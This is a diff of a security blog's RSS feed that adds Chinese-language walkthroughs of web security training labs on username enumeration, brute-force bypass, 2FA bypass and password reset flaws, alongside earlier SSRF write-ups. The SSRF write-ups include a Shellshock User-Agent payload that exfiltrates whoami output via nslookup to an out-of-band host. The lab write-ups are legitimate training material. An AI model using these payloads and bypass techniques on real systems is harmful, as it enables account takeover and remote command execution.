@@ -1,4 +1,117 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Terminal</title><link>/posts/</link><description>Recent content in Posts on Terminal</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sat, 30 Nov 2024 18:37:38 +0800</lastBuildDate><atom:link href="/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>[Write Up]Lab: Blind SSRF with Shellshock exploitation</title><link>/posts/ssrf-lab-shellshock-exploitation/</link><pubDate>Sat, 30 Nov 2024 18:37:38 +0800</pubDate><guid>/posts/ssrf-lab-shellshock-exploitation/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Terminal</title><link>/posts/</link><description>Recent content in Posts on Terminal</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sun, 01 Dec 2024 18:44:29 +0800</lastBuildDate><atom:link href="/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>[Write Up]Lab: Username enumeration via account lock</title><link>/posts/authentication-lab-username-enumeration-via-account-lock/</link><pubDate>Sun, 01 Dec 2024 18:44:29 +0800</pubDate><guid>/posts/authentication-lab-username-enumeration-via-account-lock/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-username-enumeration-via-account-lock-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-username-enumeration-via-account-lock-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>进入Lab页面后，点击右上角&lt;code>My account&lt;/code>按钮后进入&lt;code>login&lt;/code>页面&lt;/li>
+&lt;li>此题目提到&lt;code>account lock&lt;/code>意思是当&lt;code>用户存在时，多次尝试登录将会被禁止&lt;/code>，通过此特性，使用Burp Intruder的&lt;code>Cluster bomb attack&lt;/code>模式，2个参数分别为&lt;code>username&lt;/code>、以及&lt;code>password&lt;/code>的尾缀，参数1使用字典使用题目中&lt;code>Candidate usernames&lt;/code>所提供的列表，参数2使用&lt;code>Null payloads&lt;/code>且&lt;code>Generate 5&lt;/code>&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">username=§username§&amp;amp;password=password§
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
+&lt;li>扫描结果发现&lt;code>username&lt;/code>为&lt;code>academico&lt;/code>时会出现长度为&lt;code>3292&lt;/code>的返回，其内容包含&lt;code>You have made too many incorrect login attempts. Please try again in 1 minute(s).&lt;/code>，因此可以确认&lt;code>academico&lt;/code>是存在的用户
+&lt;img alt="Account lock" src="/img/authentication-lab-username-enumeration-via-account-lock-2.jpg">&lt;/li>
+&lt;li>下一步在确认&lt;code>username&lt;/code>参数的前提下，通过python实现以下爆破方式
+&lt;ol>
+&lt;li>使用&lt;code>username=academico&amp;amp;password=&amp;lt;password&amp;gt;&lt;/code>进行登录尝试，&lt;code>&amp;lt;password&amp;gt;&lt;/code>使用题目中&lt;code>Candidate passwords&lt;/code>所提供的列表进行替换，并判断返回内容包含&lt;code>Your username is&lt;/code>则表示登录成功&lt;/li>
+&lt;li>重复步骤1三次后，&lt;code>time.sleep(60)&lt;/code>，避免被禁止&lt;/li>
+&lt;/ol>
+&lt;/li>
+&lt;li>爆破成功后获得密码，使用&lt;code>academico:aaaaaa&lt;/code>登录后即可解题&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Broken brute-force protection, IP block</title><link>/posts/authentication-lab-broken-bruteforce-protection-ip-block/</link><pubDate>Sun, 01 Dec 2024 16:51:17 +0800</pubDate><guid>/posts/authentication-lab-broken-bruteforce-protection-ip-block/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-broken-bruteforce-protection-ip-block-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-broken-bruteforce-protection-ip-block-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>进入Lab页面后，点击右上角&lt;code>My account&lt;/code>按钮后进入&lt;code>login&lt;/code>页面&lt;/li>
+&lt;li>在尝试几次手动登录错误后，会出现以下信息，且新增&lt;code>X-X-Forwarded-For&lt;/code>请求头后仍然会被禁止高频尝试
+&lt;img alt="Brute-force protection" src="/img/authentication-lab-broken-bruteforce-protection-ip-block-2.jpg">&lt;/li>
+&lt;li>可以通过成功登录绕过此策略，所以通过python实现以下爆破方式
+&lt;ol>
+&lt;li>使用&lt;code>username=carlos&amp;amp;password=&amp;lt;password&amp;gt;&lt;/code>进行登录尝试，&lt;code>&amp;lt;password&amp;gt;&lt;/code>使用题目中&lt;code>Candidate passwords&lt;/code>所提供的列表进行替换，并判断返回内容包含&lt;code>Your username is&lt;/code>则表示登录成功&lt;/li>
+&lt;li>重复步骤1两次后，使用&lt;code>username=wiener&amp;amp;password=peter&lt;/code>进行成功登录，避免被禁止&lt;/li>
+&lt;/ol>
+&lt;/li>
+&lt;li>爆破成功后获得密码，使用&lt;code>carlos:austin&lt;/code>登录后即可解题&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Authentication Lab Username Enumeration via Response Timing</title><link>/posts/authentication-lab-username-enumeration-via-response-timing/</link><pubDate>Sun, 01 Dec 2024 15:04:12 +0800</pubDate><guid>/posts/authentication-lab-username-enumeration-via-response-timing/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-username-enumeration-via-response-timing-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-username-enumeration-via-response-timing-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>进入Lab页面后，点击右上角&lt;code>My account&lt;/code>按钮后进入&lt;code>login&lt;/code>页面&lt;/li>
+&lt;li>根据题目提示需要通过请求返回时间判断用户是否存在，构建枚举用户名请求体时需要在&lt;code>password&lt;/code>参数输入足够长的值；另外题目也提到本地部署了简单的&lt;code>IP-based brute-force protection&lt;/code>，所以需要在请求头新增&lt;code>X-Forwarded-For&lt;/code>用于绕过防御，Burp Intruder使用&lt;code>Battering ram attack&lt;/code>模式，字典使用题目中&lt;code>Candidate passwords&lt;/code>所提供的列表+&lt;code>wiener&lt;/code>，请求内容如下&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /login &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Forwarded-For&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">ip.§ip§&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username=§username§&amp;amp;password=wrongpasswordwrongpasswordwrongpasswordwrongpasswordwrongpasswordwrongpasswordwrongpasswordwrongpassword
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
+&lt;li>将结果根据&lt;code>Response completed&lt;/code>排序，明显的&lt;code>wiener&lt;/code>、&lt;code>ap&lt;/code>两个用户相关的请求时间高与其他用户的请求，所以可以推断&lt;code>ap&lt;/code>也是存在的用户
+&lt;img alt="Intruder result" src="/img/authentication-lab-username-enumeration-via-response-timing-2.jpg">&lt;/li>
+&lt;li>下一步在确认&lt;code>username&lt;/code>参数的前提下，继续使用&lt;code>Battering ram attack&lt;/code>模式扫描&lt;code>password&lt;/code>参数，字典使用题目中&lt;code>Candidate passwords&lt;/code>所提供的列表，请求内容如下&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /login &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Forwarded-For&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">ip.§ip§&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username=ap&amp;amp;password=§pwd§
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="5">
+&lt;li>在过滤器中将&lt;code>status code 2xx&lt;/code>过滤，即可获得正确的&lt;code>password&lt;/code>为&lt;code>987654321&lt;/code>&lt;/li>
+&lt;li>使用&lt;code>ap:987654321&lt;/code>登录后即可解题&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Username enumeration via subtly different responses</title><link>/posts/authentication-lab-username-enumeration-via-subtly-different-responses/</link><pubDate>Sun, 01 Dec 2024 14:40:34 +0800</pubDate><guid>/posts/authentication-lab-username-enumeration-via-subtly-different-responses/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-username-enumeration-via-subtly-different-responses-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-username-enumeration-via-subtly-different-responses-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>进入Lab页面后，点击右上角&lt;code>My account&lt;/code>按钮后进入&lt;code>login&lt;/code>页面&lt;/li>
+&lt;li>尝试随机输入&lt;code>Username&lt;/code>和&lt;code>Password&lt;/code>登录，页面上出现&lt;code>Invalid username or password.&lt;/code>关键字
+&lt;img alt="Invalid username" src="/img/authentication-lab-username-enumeration-via-subtly-different-responses-2.jpg">&lt;/li>
+&lt;li>使用Burp Intruder对username进行遍历，字典使用题目中&lt;code>Candidate usernames&lt;/code>所提供的列表；扫描结束后，使用过滤器中使用&lt;code>Negative search&lt;/code>功能过滤出存在的&lt;code>username&lt;/code>，且其返回内容包含&lt;code>Invalid username or password.&lt;/code>
+&lt;img alt="Invalid username" src="/img/authentication-lab-username-enumeration-via-subtly-different-responses-3.jpg">&lt;/li>
+&lt;li>根据过滤结果存在的&lt;code>username&lt;/code>为&lt;code>guest&lt;/code>，且其关键字为&lt;code>Invalid username or password&lt;/code>
+&lt;img alt="Invalid username" src="/img/authentication-lab-username-enumeration-via-subtly-different-responses-4.jpg">&lt;/li>
+&lt;li>下一步在确认&lt;code>username&lt;/code>参数的前提下，继续扫描&lt;code>password&lt;/code>参数，字典使用题目中&lt;code>Candidate passwords&lt;/code>所提供的列表&lt;/li>
+&lt;li>在过滤器中将&lt;code>status code 2xx&lt;/code>过滤，即可获得正确的&lt;code>password&lt;/code>为&lt;code>mustang&lt;/code>
+&lt;img alt="Invalid username" src="/img/authentication-lab-username-enumeration-via-subtly-different-responses-5.jpg">&lt;/li>
+&lt;li>使用&lt;code>guest:mustang&lt;/code>登录后即可解题&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Password reset broken logic</title><link>/posts/authentication-lab-password-reset-broken-logic/</link><pubDate>Sun, 01 Dec 2024 12:09:59 +0800</pubDate><guid>/posts/authentication-lab-password-reset-broken-logic/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-password-reset-broken-logic-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-password-reset-broken-logic-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>点击右上角&lt;code>My account&lt;/code>后进入登录页面&lt;/li>
+&lt;li>点击登录页面下方&lt;code>Forgot password?&lt;/code>进行忘记密码流程，在输入框中输入&lt;code>wiener&lt;/code>，尝试重置&lt;code>wiener&lt;/code>用户密码&lt;/li>
+&lt;li>回到登录页面使用&lt;code>wiener:peter&lt;/code>登录&lt;code>wiener&lt;/code>用户，并点击上方&lt;code>Email client&lt;/code>查看重置密码邮件，点击链接后进入重置密码页面&lt;/li>
+&lt;li>填入所需信息后送出，请求为&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password?temp-forgot-password-token=pyaq699vscgleejbj3y755qhgxy02icn &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0a060049043383ec80a812580035006b.web-security-academy.net&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>temp-forgot-password-token=pyaq699vscgleejbj3y755qhgxy02icn&amp;amp;username=wiener&amp;amp;new-password-1=123&amp;amp;new-password-2=123
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="5">
+&lt;li>修改&lt;code>username&lt;/code>参数为&lt;code>carlos&lt;/code>后再次发送请求，登出&lt;code>wiener&lt;/code>用户后回到登录页面使用&lt;code>carlos:123&lt;/code>登录即可解题&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: 2FA simple bypass</title><link>/posts/authentication-lab-2fa-simple-bypass/</link><pubDate>Sun, 01 Dec 2024 11:45:06 +0800</pubDate><guid>/posts/authentication-lab-2fa-simple-bypass/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-2fa-simple-bypass-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-2fa-simple-bypass-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>点击右上角&lt;code>My account&lt;/code>后进入登录页面&lt;/li>
+&lt;li>使用&lt;code>wiener:peter&lt;/code>进行登录，此时需要输入&lt;code>4-digit security code&lt;/code>，通过上方的&lt;code>Email client&lt;/code>按钮跳转页面后获得&lt;code>security code&lt;/code>，输入后跳转至&lt;code>/my-account&lt;/code>&lt;/li>
+&lt;li>尝试使用&lt;code>carlos:montoya&lt;/code>进行登录，登录后仍然需要输入&lt;code>4-digit security code&lt;/code>，但此时上方没有&lt;code>Email client&lt;/code>按钮，所以无法获得&lt;code>security code&lt;/code>&lt;/li>
+&lt;li>根据&lt;code>wiener&lt;/code>用户成功的登录逻辑，输入&lt;code>security code&lt;/code>后会跳转至&lt;code>/my-account&lt;/code>，所以在此之间将url修改为&lt;code>/my-account&lt;/code>，即可解题&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Username enumeration via different responses</title><link>/posts/authentication-lab-username-enumeration-via-different-responses/</link><pubDate>Sun, 01 Dec 2024 11:02:51 +0800</pubDate><guid>/posts/authentication-lab-username-enumeration-via-different-responses/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-username-enumeration-via-different-responses-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-username-enumeration-via-different-responses-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>进入Lab页面后，点击右上角&lt;code>My account&lt;/code>按钮后进入&lt;code>login&lt;/code>页面&lt;/li>
+&lt;li>尝试随机输入&lt;code>Username&lt;/code>登录，页面上出现&lt;code>Invalid username&lt;/code>关键字
+&lt;img alt="Invalid username" src="/img/authentication-lab-username-enumeration-via-different-responses-2.jpg">&lt;/li>
+&lt;li>使用Burp Intruder对username进行遍历，字典使用题目中&lt;code>Candidate usernames&lt;/code>所提供的列表；扫描结束后，使用过滤器中使用&lt;code>Negative search&lt;/code>功能过滤出存在的&lt;code>username&lt;/code>，且其返回内容包含&lt;code>Incorrect password&lt;/code>
+&lt;img alt="Negative search" src="/img/authentication-lab-username-enumeration-via-different-responses-3.jpg">&lt;/li>
+&lt;li>根据过滤结果存在的&lt;code>username&lt;/code>为&lt;code>adm&lt;/code>，下一步在确认&lt;code>username&lt;/code>参数的前提下，继续扫描&lt;code>password&lt;/code>参数，字典使用题目中&lt;code>Candidate passwords&lt;/code>所提供的列表&lt;/li>
+&lt;li>同样在过滤器中使用&lt;code>Negative search&lt;/code>功能过滤，即可获得正确的&lt;code>password&lt;/code>为&lt;code>princess&lt;/code>
+&lt;img alt="Negative search" src="/img/authentication-lab-username-enumeration-via-different-responses-4.jpg">&lt;/li>
+&lt;li>使用&lt;code>adm:princess&lt;/code>登录后即可解题&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Blind SSRF with Shellshock exploitation</title><link>/posts/ssrf-lab-shellshock-exploitation/</link><pubDate>Sat, 30 Nov 2024 18:37:38 +0800</pubDate><guid>/posts/ssrf-lab-shellshock-exploitation/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
 &lt;p>&lt;img alt="Lab description" src="/img/ssrf-lab-shellshock-exploitation-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
 &lt;p>&lt;img alt="Lab description" src="/img/ssrf-lab-shellshock-exploitation-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
@@ -7,10 +120,10 @@
 &lt;li>此题建议使用&lt;a href="https://blog.cloudflare.com/inside-shellshock/">Shellshock&lt;/a>执行系统命令获得OS用户&lt;/li>
 &lt;li>在&lt;code>User-Agent&lt;/code>请求头写入Shellshock payload，在&lt;code>Referer&lt;/code>请求头指定内部服务器地址&lt;/li>
 &lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>GET /product?productId=8 HTTP/2
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host: 0a8c00a60471f6ef82a26f06005400ee.web-security-academy.net
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User-Agent: () { ignored;};/usr/bin/nslookup $(whoami).g9qshqvqxiflz8z00kvd9oxt5kbcz4nt.oastify.com
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Referer: http://192.168.0.xxx:8080
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /product?productId=8 &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0a8c00a60471f6ef82a26f06005400ee.web-security-academy.net&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User-Agent&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">() { ignored;};/usr/bin/nslookup $(whoami).g9qshqvqxiflz8z00kvd9oxt5kbcz4nt.oastify.com&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Referer&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">http://192.168.0.xxx:8080&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="4">
 &lt;li>使用Burp Intruder遍历内部服务器地址(&lt;code>Referer&lt;/code>请求头)&lt;/li>
 &lt;li>回到Burp Collaborator观察即可获得OS用户(peter-PjP23W)，提交至页面后结束
@@ -24,8 +137,8 @@
 &lt;li>首先在Burp -&amp;gt; Collaborator -&amp;gt; 点击Copy to clipboard&lt;/li>
 &lt;li>将上步获得的url替换请求中的Referer，例如&lt;/li>
 &lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>GET /product?productId=1 HTTP/2
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Referer: https://3qufydcde5w8gvgnh7c0qbegm7sygp4e.oastify.com
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /product?productId=1 &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Referer&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">https://3qufydcde5w8gvgnh7c0qbegm7sygp4e.oastify.com&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="4">
 &lt;li>发送请求后在Collaborator面板即可观察到相关信息&lt;/li>
 &lt;/ol></content></item><item><title>[Write Up]Lab: SSRF with filter bypass via open redirection vulnerability</title><link>/posts/ssrf-lab-ssrf-filter-bypass-via-open-redirection/</link><pubDate>Sat, 30 Nov 2024 15:55:02 +0800</pubDate><guid>/posts/ssrf-lab-ssrf-filter-bypass-via-open-redirection/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
@@ -36,16 +149,16 @@
 &lt;li>目标入口同&lt;a href="/posts/ssrf-lab-basic-ssrf-against-localhost/">前题&lt;/a>&lt;/li>
 &lt;li>直接在请求体中设置&lt;code>http://192.168.0.12:8080/admin&lt;/code>会获得错误&lt;/li>
 &lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>HTTP/2 400 Bad Request
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type: application/json; charset=utf-8
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Frame-Options: SAMEORIGIN
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length: 48
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/json; charset=utf-8&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Frame-Options&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">SAMEORIGIN&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">48&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;Invalid external stock check url &amp;#39;Invalid URL&amp;#39;&amp;#34;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#34;Invalid external stock check url &amp;#39;Invalid URL&amp;#39;&amp;#34;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
 &lt;li>观察页面下方有&lt;code>Next product&lt;/code>按钮，对应请求为&lt;/li>
 &lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>GET /product/nextProduct?currentProductId=1&lt;span style="color:#960050;background-color:#1e0010">&amp;amp;&lt;/span>path=/product?productId=2 HTTP/2
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /product/nextProduct?currentProductId=1&amp;amp;path=/product?productId=2 &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol>
 &lt;li>点击按钮后，页面将跳转至path参数地址，即为&lt;code>/product?productId=2&lt;/code>，利用此特性，将请求体设置为&lt;code>/product/nextProduct?currentProductId=1&amp;amp;path=&lt;/code>，后面接上目的地址，最终url请求体为&lt;code>%2fproduct%2fnextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a%2f%2f192.168.0.12%3a8080%2fadmin&lt;/code>，将请求体修改并发送后得知删除用户&lt;code>carlos&lt;/code>的url为&lt;code>http://192.168.0.12:8080/admin/delete?username=carlos&lt;/code>，将请求体修改为此url后即可达成目的&lt;/li>
 &lt;/ol></content></item><item><title>[Write Up]Lab: SSRF with whitelist-based input filter</title><link>/posts/ssrf-lab-ssrf-with-whitelist-filter/</link><pubDate>Sat, 30 Nov 2024 15:19:16 +0800</pubDate><guid>/posts/ssrf-lab-ssrf-with-whitelist-filter/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
@@ -56,12 +169,12 @@
 &lt;li>目标入口同&lt;a href="/posts/ssrf-lab-basic-ssrf-against-localhost/">前题&lt;/a>，但此题部署了1个防止SSRF的防御措施&lt;/li>
 &lt;li>若将请求体设置为&lt;code>http://localhost/admin&lt;/code>会获得以下返回&lt;/li>
 &lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>HTTP/2 400 Bad Request
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type: application/json; charset=utf-8
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Frame-Options: SAMEORIGIN
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length: 58
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/json; charset=utf-8&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Frame-Options&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">SAMEORIGIN&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">58&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;External stock check host must be stock.weliketoshop.net&amp;#34;
